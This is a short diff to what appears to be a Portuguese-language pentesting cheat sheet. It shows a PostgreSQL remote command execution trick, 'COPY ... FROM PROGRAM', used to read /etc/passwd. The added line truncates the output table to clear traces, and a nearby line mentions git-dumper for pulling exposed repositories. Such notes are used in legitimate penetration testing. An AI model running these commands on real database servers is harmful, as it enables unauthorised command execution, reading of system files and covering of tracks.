@@ -7381,6 +7381,7 @@ Tags: `#comandos-avulsos` `#misc` `Coammandos aleatorios`
 	RCE
 	COPY public.cmd_output FROM PROGRAM 'cat /etc/passwd';
 	SELECT * FROM public.cmd_output;
+	TRUNCATE TABLE public.cmd_output; CLEAN COMMANDS FROM TABLE
 
 
 	git-dumper | echo "BAIXA O GIT EXPOSTO"
